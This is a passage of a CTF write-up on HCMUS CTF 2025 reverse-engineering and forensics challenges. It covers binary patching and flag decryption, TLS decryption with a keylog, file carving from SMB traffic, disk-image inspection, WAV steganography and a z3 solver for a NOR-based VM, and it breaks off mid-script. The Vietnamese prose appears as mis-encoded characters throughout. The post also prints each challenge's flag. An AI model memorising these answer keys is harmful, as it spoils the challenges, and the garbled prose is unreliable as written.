---
title: HCMUS CTF 2025
data: 2025-08-10
categories: [Write up]
tags: [CTFs, Reverse, Forensics]
image: /assets/posts/HCMUS_CTF_2025/hcmus-ctf_2025.jpg
math: true
description: Write-up HCMUS CTF 2025
---


## HCMUS-CTF 2025 Quals

### Reverse/Hide and seek

![image](https://hackmd.io/_uploads/SylJ2yALll.png)

![image](https://hackmd.io/_uploads/S1BS61R8xe.png)

Ch∆∞∆°ng tr√¨nh b·ªã nh√©t nhi·ªÅu byte r√°c `0xE9` l√†m cho IDA kh√¥ng gen ƒë∆∞·ª£c m√£ gi·∫£, vi·∫øt script patch th√†nh `NOP` l√† ƒë∆∞·ª£c.

```python
chall = bytearray(open("main", "rb").read())
for i in range(len(chall)):
    if chall[i:i+7] == b'\x0F\x84\x01\x00\x00\x00\xE9':
        chall[i+6] = 0x90
        i += 7
open("main_patched", "wb").write(chall)
```

Debug v√† quan s√°t ƒëo·∫°n n√†y khi ch·∫°y l·∫ßn ƒë·∫ßu v∆°i `idx = 0` th√¨ g√¢y exeption:

![image](https://hackmd.io/_uploads/SyAsze0Ugl.png)

Ph√¢n t√≠ch h√†m `handler`:

![image](https://hackmd.io/_uploads/BJsZmlCIel.png)

ƒê·ªçc 46 byte input, n·∫øu kh√¥ng ƒë·ªß th√¨ g·ªçi h√†m `delete_and_create_file` x√≥a file hi·ªán t·∫°i v√† t·∫°o file m·ªõi 

![image](https://hackmd.io/_uploads/SkjA4xCLgl.png)

:::warning
P/S: Ban ƒë·∫ßu m√¨nh ch·∫°y chall tr∆∞·ªõc khi m·ªü b·∫±ng IDA n√™n sau khi test v·ªõi input sai th√¨ sinh file m·ªõi l√†m cho vi·ªác ph√¢n t√≠ch sai kh√¥ng th·ªÉ gi·∫£i ƒë∆∞·ª£c v·ªõi crack **MD5** kh√° ƒë√°ng ti·∫øc.
![image](https://hackmd.io/_uploads/SJ9fNx08gx.png)
:::

Sau khi nh·∫≠n input, th·ª±c hi·ªán x√°o v·ªõi thu·∫≠t to√°n **Fisher-yates shuffle** v√† seed kh·ªüi t·∫°o **0x13371337**.

![image](https://hackmd.io/_uploads/S11oVlR8gg.png)

G·ªçi h√†m **sub_16F6** v·ªõi h√†m con ƒë·∫ßu ti√™n **sub_13C4** t·∫°o file m·ªõi d·ª±a tr√™n file ƒëang ch·∫°y hi·ªán t·∫°i v√† l∆∞u `input, seed` v√†o file v·ª´a t·∫°o, set quy·ªÅn th·ª±c thi r·ªìi g·ªçi h√†m con **sub_165E** th·ª±c thi v·ªõi tham s·ªë `l33t`.

![image](https://hackmd.io/_uploads/ByqePe0Llx.png)

![image](https://hackmd.io/_uploads/BJq7dx0Uee.png)

Ki·ªÉm ch·ª©ng v·ªõi l·ªánh linux `strace -f -e trace=all ./main`:
```shell
> strace -f -e trace=all ./main
execve("./main", ["./main"], 0x7ffc05ffe298 /* 43 vars */) = 0
brk(NULL)                               = 0x5ce2e9d51000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x739c2a0d6000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=32706, ...}) = 0
mmap(NULL, 32706, PROT_READ, MAP_PRIVATE, 3, 0) = 0x739c2a0ce000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000\237\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
fstat(3, {st_mode=S_IFREG|0755, st_size=2003408, ...}) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2055640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x739c29ed8000
mmap(0x739c29f00000, 1462272, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x739c29f00000
mmap(0x739c2a065000, 352256, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0x739c2a065000
mmap(0x739c2a0bb000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e2000) = 0x739c2a0bb000
mmap(0x739c2a0c1000, 52696, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x739c2a0c1000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x739c29ed5000
arch_prctl(ARCH_SET_FS, 0x739c29ed5740) = 0
set_tid_address(0x739c29ed5a10)         = 1359
set_robust_list(0x739c29ed5a20, 24)     = 0
rseq(0x739c29ed6060, 0x20, 0, 0x53053053) = 0
mprotect(0x739c2a0bb000, 16384, PROT_READ) = 0
mprotect(0x5ce2da730000, 4096, PROT_READ) = 0
mprotect(0x739c2a10b000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x739c2a0ce000, 32706)           = 0
rt_sigaction(SIGFPE, {sa_handler=0x5ce2da72e742, sa_mask=[FPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x739c29f17d20}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
--- SIGFPE {si_signo=SIGFPE, si_code=FPE_INTDIV, si_addr=0x5ce2da72e9b4} ---
write(1, "> ", 2> )                       = 2
read(0, HCMUS-CTF{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}
"HCMUS-CTF{aaaaaaaaaaaaaaaaaaaaaa"..., 47) = 47
openat(AT_FDCWD, "/proc/self/exe", O_RDONLY) = 3
fstat(3, {st_mode=S_IFREG|0777, st_size=29128, ...}) = 0
mmap(NULL, 29128, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x739c2a0ce000
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240\20\0\0\0\0\0\0"..., 29128) = 29128
close(3)                                = 0
unlink("./main")                        = 0
openat(AT_FDCWD, "./main", O_WRONLY|O_CREAT|O_TRUNC, 0700) = 3
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\240\20\0\0\0\0\0\0"..., 29128) = 29128
close(3)                                = 0
munmap(0x739c2a0ce000, 29128)           = 0
execve("./main", ["./main", "l33t"], 0x7ffd88821db8 /* 0 vars */) = 0
brk(NULL)                               = 0x5f92ccf7c000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb6b5bf8000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=32706, ...}) = 0
mmap(NULL, 32706, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fb6b5bf0000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000\237\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
fstat(3, {st_mode=S_IFREG|0755, st_size=2003408, ...}) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2055640, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fb6b59fa000
mmap(0x7fb6b5a22000, 1462272, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x7fb6b5a22000
mmap(0x7fb6b5b87000, 352256, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x18d000) = 0x7fb6b5b87000
mmap(0x7fb6b5bdd000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e2000) = 0x7fb6b5bdd000
mmap(0x7fb6b5be3000, 52696, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fb6b5be3000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb6b59f7000
arch_prctl(ARCH_SET_FS, 0x7fb6b59f7740) = 0
set_tid_address(0x7fb6b59f7a10)         = 1359
set_robust_list(0x7fb6b59f7a20, 24)     = 0
rseq(0x7fb6b59f8060, 0x20, 0, 0x53053053) = 0
mprotect(0x7fb6b5bdd000, 16384, PROT_READ) = 0
mprotect(0x5f9298392000, 4096, PROT_READ) = 0
mprotect(0x7fb6b5c2d000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
munmap(0x7fb6b5bf0000, 32706)           = 0
rt_sigaction(SIGFPE, {sa_handler=0x5f9298390742, sa_mask=[FPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7fb6b5a39d20}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
write(1, "no\n", 3no
)                     = 3
mmap(NULL, 14552, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fb6b5bf4000
unlink("./main")                        = 0
openat(AT_FDCWD, "./main", O_WRONLY|O_CREAT|O_TRUNC, 0700) = 3
write(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0@\23\0\0\0\0\0\0"..., 14552) = 14552
close(3)                                = 0
munmap(0x7fb6b5bf4000, 14552)           = 0
exit(1)                                 = ?
+++ exited with 1 +++
```

Lu·ªìng m·ªõi s·∫Ω check input **xor** seed v·ªõi enc t·∫°i idx.

N·∫øu idx ch∆∞a b·∫±ng 46 th√¨ caculate seed v√† ti·∫øp t·ª•c t·∫°o file m·ªõi v√† th·ª±c thi.

![image](https://hackmd.io/_uploads/rJUHclR8el.png)

T√≥m l·∫°i lu·ªìng th·ª±c thi c·ªßa challenge n√†y l√† ch·∫°y ch∆∞∆°ng tr√¨nh l·∫ßn ƒë·∫ßu v·ªõi `idx = 0` th√¨ g√¢y ra exception --> handler ƒë∆∞·ª£c ƒëƒÉng k√Ω x·ª≠ l√Ω b·∫±ng c√°ch ƒë·ªçc input, kh·ªüi t·∫°o file m·ªõi d·ª±a tr√™n file hi·ªán t·∫°i ƒë·ªìng th·ªùi x√°o input v·ªõi seed kh·ªüi t·∫°o.
N·∫øu idx ch∆∞a ƒë·∫°t 46 th√¨ ti·∫øp t·ª•c caculate seed g·ªçi **sub_16F6** v·ªõi seed m·ªõi ti·∫øp t·ª•c lu·ªìng check cho t·ªõi khi h·∫øt byte input.

Nh∆∞ v·∫≠y ƒë·ªÉ t√¨m flag, ƒë·∫ßu ti√™n s·∫Ω m√¥ ph·ªèng lu·ªìng x√°o **Fisher-yates**, l∆∞u l·∫°i c√°c ch·ªâ s·ªë swaps ban ƒë·∫ßu, sau ƒë√≥ xor v·ªõi seed m√† ƒë∆∞·ª£c ghi ƒë√® t·ª´ sau b∆∞·ªõc x√°o --> x√°o l·∫°i theo ch·ªâ s·ªë ban ƒë·∫ßu ƒë√£ l∆∞u.

```python
enc = bytearray.fromhex("72C36B0CCF65EDBA18CA8F99E68A7FA6E4444C145B9E73D361EB44820DC407C7E582E5B70A394CD251530550126C")
seed = 0x13371337

def LCG(a1):
    a1 = 1664525 * a1 + 0x3C6EF35F
    return a1 & 0xFFFFFFFF

flag = bytearray(len(enc))
swaps = []

for i in range(len(enc)-1, 0, -1):
    seed = LCG(seed)
    swaps.append((i, seed % (i + 1)))
# print(swaps)
for i in range(len(enc)):
    flag[i] = enc[i] ^ (seed & 0xFF)
    seed = LCG(seed)

for i, j in reversed(swaps):
    flag[i], flag[j] = flag[j], flag[i]
print(flag.decode())
# HCMUS-CTF{d1d_y0u_kn0vv_y0u12_O5_c4n_d0_th1s?}
```

> `HCMUS-CTF{d1d_y0u_kn0vv_y0u12_O5_c4n_d0_th1s?}`

### Forensics/TLS Challenge
![image](https://hackmd.io/_uploads/HJWfEHq8xe.png)
> Can you extract the flag from encrypted HTTPS?

ƒê·ªÅ cho 1 file `capture.pcap` v·ªõi n·ªôi dung g√≥i tin b·ªã m√£ h√≥a v√† 1 file `keylog.log`.
![image](https://hackmd.io/_uploads/BJW_NBqIlx.png)
ƒê·ªçc qua file keylog.log th√¨ th·∫•y n√≥ cung c·∫•p **TLS secret** t·∫°o b·ªüi **OpenSSL/Python**.
Nh∆∞ v·∫≠y, theo m√¥ t·∫£ chall v√† c√°c file ƒë∆∞·ª£c cung c·∫•p th√¨ m·ª•c ti√™u r√µ r√†ng l√† gi·∫£i m·∫£ l∆∞u l∆∞·ª£ng TLS trong file pcap ƒë·ªÉ truy xu·∫•t n·ªôi dung g·ªëc (HTTP b√™n trong HTTPS).

![image](https://hackmd.io/_uploads/BJbqIHq8lx.png)
M·ªü `capture.pcap` b·∫±ng **Wiresharek** v√† import file `keylog.log` ƒë·ªÉ gi·∫£i m√£.
![image](https://hackmd.io/_uploads/rkLePr9Llx.png)
> `HCMUS-CTF{tls_tr@ffic_@n@lysis_ch@ll3ng3}`


### Forensics/Trashbin

> Someone‚Äôs been treating my computer like a trash bin, constantly dumping useless files into it. But it seems he got careless and dropped a really important one in there. Even though he deleted it afterward, it might have been too late‚Äîheheüòè.

ƒê·ªÅ cung c·∫•p 1 file `trash.pcap` k·∫øt h·ª£p v·ªõi m√¥ t·∫£ challenge th√¨ m·ª•c ti√™u l√† kh√¥i ph·ª•c l·∫°i file b·ªã x√≥a sau khi g·ª≠i.
May m·∫Øn l√† file ƒë∆∞·ª£c g·ª≠i qua m·∫°ng th√¥ng qua giao th·ª©c **SMB2** n√™n c√≥ th·ªÉ ph·ª•c h·ªìi l·∫°i ƒë∆∞·ª£c t·ª´ g√≥i tin m·∫°ng.
D√πng l·ªánh `foremost -i trash.pcap -o out` ƒë·ªÉ kh√¥i ph·ª•c l·∫°i file b·ªã x√≥a:
```
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Sat Jul 19 13:10:43 2025
Invocation: foremost -i trash.pcap -o out 
Output directory: /mnt/d/CTF/rev/HCMUSCTF/2025/FOR_Trashbin/out
Configuration file: /etc/foremost.conf
------------------------------------------------------------------
File: trash.pcap
Start: Sat Jul 19 13:10:43 2025
Length: 483 KB (495585 bytes)
 
Num	 Name (bs=512)	       Size	 File Offset	 Comment 

0:	00000022.zip 	      248 B 	      11747 	 
1:	00000029.zip 	      244 B 	      14971 	 
2:	00000035.zip 	      236 B 	      18191 	 
3:	00000041.zip 	      260 B 	      21403 	 
4:	00000048.zip 	      255 B 	      24639 	 
5:	00000054.zip 	      212 B 	      27870 	 
6:	00000060.zip 	      234 B 	      31058 	 
7:	00000066.zip 	      235 B 	      34268 	 
8:	00000073.zip 	      246 B 	      37487 	 
9:	00000079.zip 	      268 B 	      40717 	 
10:	00000085.zip 	      261 B 	      43969 	 
11:	00000092.zip 	      226 B 	      47214 	 
12:	00000098.zip 	      268 B 	      50424 	 
13:	00000104.zip 	      268 B 	      53676 	 
14:	00000111.zip 	      247 B 	      56928 	 
15:	00000117.zip 	      268 B 	      60159 	 
16:	00000123.zip 	      258 B 	      63403 	 
17:	00000130.zip 	      258 B 	      66637 	 
18:	00000136.zip 	      219 B 	      69871 	 
19:	00000142.zip 	      247 B 	      73066 	 
20:	00000149.zip 	      258 B 	      76289 	 
21:	00000155.zip 	      223 B 	      79523 	 
22:	00000161.zip 	      258 B 	      82722 	 
23:	00000167.zip 	      258 B 	      85956 	 
24:	00000174.zip 	      210 B 	      89190 	 
25:	00000180.zip 	      258 B 	      92376 	 
26:	00000186.zip 	      258 B 	      95610 	 
27:	00000193.zip 	      217 B 	      98844 	 
28:	00000199.zip 	      252 B 	     102037 	 
29:	00000205.zip 	      220 B 	     105265 	 
30:	00000211.zip 	      253 B 	     108461 	 
31:	00000218.zip 	      250 B 	     111690 	 
32:	00000224.zip 	      232 B 	     114916 	 
33:	00000230.zip 	      215 B 	     118124 	 
34:	00000236.zip 	      221 B 	     121315 	 
35:	00000243.zip 	      229 B 	     124512 	 
36:	00000249.zip 	      260 B 	     127717 	 
37:	00000255.zip 	      253 B 	     130953 	 
38:	00000262.zip 	      262 B 	     134182 	 
39:	00000268.zip 	      262 B 	     137420 	 
40:	00000274.zip 	      221 B 	     140658 	 
41:	00000280.zip 	      243 B 	     143855 	 
42:	00000287.zip 	      214 B 	     147074 	 
43:	00000293.zip 	      262 B 	     150264 	 
44:	00000299.zip 	      262 B 	     153502 	 
45:	00000306.zip 	      222 B 	     156740 	 
46:	00000312.zip 	      226 B 	     159938 	 
47:	00000318.zip 	      259 B 	     163148 	 
48:	00000324.zip 	      259 B 	     166391 	 
49:	00000331.zip 	      266 B 	     169634 	 
50:	00000337.zip 	      266 B 	     172884 	 
51:	00000343.zip 	      260 B 	     176126 	 
52:	00000350.zip 	      249 B 	     179362 	 
53:	00000356.zip 	      229 B 	     182587 	 
54:	00000362.zip 	      260 B 	     185792 	 
55:	00000369.zip 	      264 B 	     189028 	 
56:	00000375.zip 	      245 B 	     192268 	 
57:	00000381.zip 	      264 B 	     195489 	 
58:	00000388.zip 	      264 B 	     198729 	 
59:	00000394.zip 	      264 B 	     201969 	 
60:	00000400.zip 	      268 B 	     205217 	 
61:	00000407.zip 	      228 B 	     208469 	 
62:	00000413.zip 	      268 B 	     211681 	 
63:	00000419.zip 	      233 B 	     214933 	 
64:	00000426.zip 	      268 B 	     218150 	 
65:	00000432.zip 	      246 B 	     221402 	 
66:	00000438.zip 	      268 B 	     224632 	 
67:	00000445.zip 	      236 B 	     227884 	 
68:	00000451.zip 	      260 B 	     231096 	 
69:	00000457.zip 	      257 B 	     234332 	 
70:	00000463.zip 	      260 B 	     237565 	 
71:	00000470.zip 	      262 B 	     240801 	 
72:	00000476.zip 	      211 B 	     244039 	 
73:	00000482.zip 	      262 B 	     247226 	 
74:	00000489.zip 	      223 B 	     250464 	 
75:	00000495.zip 	      212 B 	     253663 	 
76:	00000501.zip 	      262 B 	     256851 	 
77:	00000507.zip 	      262 B 	     260089 	 
78:	00000514.zip 	      262 B 	     263327 	 
79:	00000520.zip 	      242 B 	     266565 	 
80:	00000526.zip 	      219 B 	     269783 	 
81:	00000533.zip 	      258 B 	     272978 	 
82:	00000539.zip 	      222 B 	     276212 	 
83:	00000545.zip 	      258 B 	     279410 	 
84:	00000552.zip 	      215 B 	     282644 	 
85:	00000558.zip 	      219 B 	     285843 	 
86:	00000564.zip 	      266 B 	     289046 	 
87:	00000570.zip 	      259 B 	     292296 	 
88:	00000577.zip 	      266 B 	     295539 	 
89:	00000583.zip 	      217 B 	     298789 	 
90:	00000589.zip 	      266 B 	     301990 	 
91:	00000596.zip 	      260 B 	     305240 	 
92:	00000602.zip 	      258 B 	     308484 	 
93:	00000608.zip 	      256 B 	     311726 	 
94:	00000615.zip 	      260 B 	     314958 	 
95:	00000621.zip 	      260 B 	     318194 	 
96:	00000627.zip 	      260 B 	     321430 	 
97:	00000634.zip 	      260 B 	     324666 	 
98:	00000640.zip 	      209 B 	     327902 	 
99:	00000646.zip 	      262 B 	     331087 	 
100:	00000652.zip 	      239 B 	     334325 	 
101:	00000659.zip 	      262 B 	     337540 	 
102:	00000665.zip 	      256 B 	     340778 	 
103:	00000671.zip 	      262 B 	     344010 	 
104:	00000678.zip 	      258 B 	     347248 	 
105:	00000684.zip 	      215 B 	     350482 	 
106:	00000690.zip 	      258 B 	     353673 	 
107:	00000770.zip 	      264 B 	     394691 	 
108:	00000777.zip 	      219 B 	     397931 	 
109:	00000783.zip 	      250 B 	     401126 	 
110:	00000789.zip 	      229 B 	     404352 	 
111:	00000796.zip 	      245 B 	     407557 	 
112:	00000802.zip 	      260 B 	     410778 	 
113:	00000808.zip 	      260 B 	     414014 	 
114:	00000814.zip 	      260 B 	     417250 	 
115:	00000821.zip 	      260 B 	     420486 	 
116:	00000827.zip 	      260 B 	     423722 	 
117:	00000833.zip 	      260 B 	     426958 	 
118:	00000840.zip 	      260 B 	     430194 	 
119:	00000846.zip 	      264 B 	     433430 	 
120:	00000852.zip 	      264 B 	     436670 	 
Finish: Sat Jul 19 13:10:44 2025

121 FILES EXTRACTED
	
zip:= 121
------------------------------------------------------------------

Foremost finished at Sat Jul 19 13:10:44 2025
```

R·∫•t nhi·ªÅu file zip n√™n s·ª≠ d·ª•ng script auto ƒë·ªÉ gi·∫£i n√©n v√† t√¨m flag:
```python
import os
import zipfile

foremost_dir = "out/zip"
flag = ''
for filename in sorted(os.listdir(foremost_dir)):
    zip_path = os.path.join(foremost_dir, filename)
    if not zipfile.is_zipfile(zip_path):
        continue
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        for zip_info in zip_ref.infolist():
            if zip_info.filename.endswith('.txt') or 'flag' in zip_info.filename.lower():
                with zip_ref.open(zip_info) as f:
                    content = f.read().decode(errors='ignore')
                    if "HCMUS-CTF" in content:
                        print(zip_info.filename)
                        flag = content.strip()
                        print(f"{flag}")
                        exit()
```
> flagishere_228.txt                                                                                                                                
`HCMUS-CTF{pr0t3ct_y0ur_SMB_0r_d1e}`


### Forensics/Disk Partition
> Too many flags... but only one is real.

ƒê·ªÅ cho 1 file `disk.img`, m·ªü b·∫±ng autospy.
![image](https://hackmd.io/_uploads/BkYA3Lq8el.png)
Ng√≥ qua th√¨ t·∫°i ph√¢n v√πng `vol3 Mac OS`, file h·ªá th·ªëng `$CatalogFile` c·ªßa HFS+ ch·ª©a th√¥ng tin metadata v·ªÅ c√°c file v√† th∆∞ m·ª•c trong ph√¢n v√πng g·ª£i √Ω t·∫°i ƒë√¢y s·∫Ω ch·ª©a file `flag.txt`.
![image](https://hackmd.io/_uploads/Skfc689Uee.png)
> `HCMUS-CTF{1gn0r3_+h3_n01$3_f1nd_m@c}`


### Forensics/File Hidden
> Relax and chill with this lo-fi track... but listen caffuly ‚Äî there might be something hidden in the sound waves.

ƒê·ªÅ cung c·∫•p 1 file √¢m thanh `JACK_J97_ÔΩú_THI√äN_L√ù_∆†I.wav`
Theo nh∆∞ m√¥ t·∫£ th√¨ c√≥ v·∫ª file flag b·ªã ·∫©n trong file √¢m thanh n√†y.
S·ª≠ d·ª•ng tool [HiddenWave](https://github.com/techchipnet/HiddenWave/blob/main/README.md) ƒë·ªÉ t√¨m file b·ªã ·∫©n.
 
![image](https://hackmd.io/_uploads/r1P7kPq8lx.png)
Ch·∫°y script `ExWave.py` th√¨ th·∫•y n·ªôi dung ·ªü d·∫°ng binary n√™n c√≥ l·∫Ω file ch·ª©a flag ·ªü d·∫°ng ƒë·∫∑t bi·ªát v√¨ th·∫ø m√¨nh s·ª≠a l·∫°i script 1 t√≠ thay v√¨ in ra th√¨ l∆∞u n·ªôi dung v√†o 1 file bin ƒë·ªÉ d·ªÖ x√°c ƒë·ªãnh.
```python
# HiddinWave Ver 1.0
# Powered by TechChip
# Secret Message Extractor
import os
import wave
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('-f', help='audiofile', dest='audiofile')
args = parser.parse_args()
af = args.audiofile
arged = False
if af:
    arged = True

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def help():
    print("\033[92mExtract Your Secret Message from Audio Wave File.\033[0m")
    print('''usage: ExWave.py [-h] [-f AUDIOFILE]

optional arguments:
  -h, --help    show this help message and exit
  -f AUDIOFILE  Select Audio File''')

def banner():
    print('''
 _  _ _    _    _         __      __
| || (_)__| |__| |___ _ _ \ \    / /_ ___ _____
| __ | / _` / _` / -_) ' \ \ \/\/ / _` \ V / -_)
|_||_|_\__,_\__,_\___|_||_|_\_/\_/\__,_|\_/\___|
                         |___| v1.0 \033[1;91mwww.techchip.net\033[0m
\033[92mVisit for more tutorials : www.youtube.com/techchipnet\033[0m
\033[93mHide your text message in wave audio file like MR.ROBOT\033[0m''')

def ex_msg(af):
    if not arged:
        help()
    else:
        print("[*] Processing audio file...")
        waveaudio = wave.open(af, mode='rb')
        frame_bytes = bytearray(list(waveaudio.readframes(waveaudio.getnframes())))
        extracted = [frame_bytes[i] & 1 for i in range(len(frame_bytes))]
        byte_array = bytearray()
        for i in range(0, len(extracted), 8):
            byte_bits = extracted[i:i+8]
            if len(byte_bits) < 8:
                break
            byte_value = int("".join(map(str, byte_bits)), 2)
            byte_array.append(byte_value)

        end_marker = b"###"
        if end_marker in byte_array:
            byte_array = byte_array.split(end_marker)[0]

        output_filename = "extracted_output.bin"
        with open(output_filename, "wb") as f:
            f.write(byte_array)

        print(f"\033[1;92m[+] Done! Extracted data saved to '{output_filename}'\033[0m")
        waveaudio.close()

cls()
banner()
try:
    ex_msg(af)
except Exception as e:
    print(f"\033[1;91m[-] Something went wrong: {e}\033[0m")
```
![image](https://hackmd.io/_uploads/S15wePqLxl.png)
ƒê·ªÉ √Ω `PK` g·ª£i √Ω ƒë·∫øn signature c·ªßa file zip, ngo√†i ra m√¨nh t·ªën th·ªùi gian ·ªü c√¢u n√†y ƒë·ªïi ƒëu√¥i sang zip nh∆∞ng v·∫´n kh√¥ng gi·∫£i n√©n ƒë∆∞·ª£c v√¨ file ch·ª©a d·ªØ li·ªáu d∆∞ (r√°c) sau ph·∫ßn ZIP ‚Äî do tool ExWave.py tr√≠ch xu·∫•t to√†n b·ªô stream LSB, k·ªÉ c·∫£ sau ph·∫ßn k·∫øt th√∫c ZIP n√™n ta s·ª≠ d·ª•ng th√™m l·ªánh linux `zip -FF extracted_output.bin --out fixed.zip` ƒë·ªÉ export file zip th·ª±c s·ª±. 
Gi·∫£i n√©n v√† l·ª•m flag:
> `HCMUS-CTF{Th13nLy_0i_J4ck_5M1ll10n}`



## HCMUS-CTF 2025 Final

### Reverse/Simple VM

```python
#!/usr/bin/python3
import pickle
import sys

mem = []

def VM(data):
    with open("image.bin", "rb") as f:
        mem = pickle.load(f)
        
    mem[60001:60017] = data
    
    while True:
        if mem[4] == 1:
            print("DONE")
            break
        i = mem[0]
        a1 = mem[i]
        a2 = mem[i + 1]
        a3 = mem[i + 2]
        
        tmp = (~(mem[a1] | mem[a2])) & 0xffff
        
        mem[a3] = tmp
        mem[1] = ((tmp >> 15) & 1) | ((tmp & 0x7FFF) << 1)
        mem[0] = i + 3
    
    return mem[60100]

key = input("Key: ").strip()

if not (len(key) == 16):
    print("Incorrect format!")
    sys.exit(1)

if VM(key.encode()) == 0:
    print("Correct!, wraps your key with HCMUS-CTF{}")
else:
    print("Incorrect key!")
```

Challenge VM load `image.bin` v√† ƒë·ªçc 16 byte key, n·∫øu `mem[60100] = 0` th√¨ key ƒë√∫ng.
C√°ch ƒë∆°n gi·∫£n nh·∫•t ƒë·ªÉ solve l√† d√πng [z3 tham kh·∫£o t·∫°i ƒë√¢y](https://microsoft.github.io/z3guide/programming/Z3%20Python%20-%20Readonly/advanced/).
```python
from z3 import *
import pickle

with open("image.bin", "rb") as f:
    mem_init = pickle.load(f)

# mem l√† Array: index BitVec(32), value BitVec(16)
mem = Array('mem', BitVecSort(32), BitVecSort(16))
for idx, val in enumerate(mem_init):
    mem = Store(mem, BitVecVal(idx, 32), BitVecVal(val, 16))
key = [BitVec(f"k{i}", 16) for i in range(16)]
for i, kv in enumerate(key):
    mem = Store(mem, BitVecVal(60001+i, 32), kv)
s = Solver()
for k in key:
    s.add(k >= 0x20, k <= 0x7e)
pc = BitVecVal(mem_init[0], 32)
j = 0
while j < 11854:
    ex = Select(mem, BitVecVal(4, 32))
    s.add(ex != BitVecVal(1, 16))
    a1 = Select(mem, pc)
    a2 = Select(mem, pc+1)
    a3 = Select(mem, pc+2)
    v1 = Select(mem, ZeroExt(16, a1))
    v2 = Select(mem, ZeroExt(16, a2))
    tmp = ~ (v1 | v2) & BitVecVal(0xffff, 16)
    mem = Store(mem, ZeroExt(16, a3), tmp)
    # mem[1] = ROL1(tmp)
    rol1 = RotateLeft(tmp, 1)
    mem = Store(mem, BitVecVal(1, 32), rol1)
    pc = pc+3
    j += 1
s.add(Select(mem, BitVecVal(60100, 32)) == BitVecVal(0, 16))

if s.check() == sat:
    m = s.model()
    print("".join(chr(m[k].as_long()) for k in key))
else:
    print("Unsat")
# 0nly_0ne_inst???
```

C√°ch th·ª© 2 s·∫Ω b·ªï sung b∆∞·ªõc disassembler VM ƒë√≥ ra ƒë·ªÉ ph√¢n t√≠ch:
```python
#!/usr/bin/python3
import pickle
import sys

mem = []
disasm = []
def VM(data):
    with open("image.bin", "rb") as f:
        mem = pickle.load(f)
        
    mem[60001:60017] = data
    with open("disasm.txt", "w") as f:
        while True:
            if mem[4] == 1:
